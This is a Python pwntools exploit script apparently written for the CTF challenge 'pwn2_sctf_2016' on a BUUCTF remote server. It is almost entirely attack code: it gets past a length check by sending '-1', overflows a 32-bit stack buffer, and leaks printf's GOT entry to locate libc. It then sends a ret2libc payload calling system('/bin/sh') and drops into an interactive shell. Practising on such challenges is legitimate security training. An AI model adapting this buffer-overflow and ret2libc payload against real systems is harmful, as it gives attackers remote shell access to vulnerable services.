#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

local = 0
os_level = 32
binary_name = 'pwn2_sctf_2016'
remote_addr, port = 'node5.buuoj.cn:26628'.split(':')

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    # libc = e.libc
else:
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)
    # libc = ELF(libc-2.23.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
show = lambda x:log.success(x)
slp = lambda x:sleep(x)


#Main function
if __name__ == '__main__':
    #you can add your code here
    printf_plt = elf.plt['printf']
    printf_got = elf.got['printf']
    main_addr = elf.symbols['main']
    payload = b'a'*0x2c + b'b'*0x4 + p32(printf_plt) + p32(main_addr) + p32(printf_got)
    sla('read?', '-1')
    #gdb.attach(p)
    sla('data!\n',payload)
    ru(p32(printf_got))
    rl()
    printf_addr = u32(rc(4))
    show('printf_addr--> ' + hex(printf_addr))
    libc = LibcSearcher('printf', printf_addr)
    libc_base = printf_addr - libc.dump('printf')
    system_addr = libc_base + libc.dump('system')
    bin_sh_addr = libc_base + libc.dump('str_bin_sh')
    payload = b'a'*0x2c + b'b'*0x4 + p32(system_addr) + p32(main_addr) + p32(bin_sh_addr)
    sla('read?', '-1')
    sla('data!\n',payload)
    p.interactive()
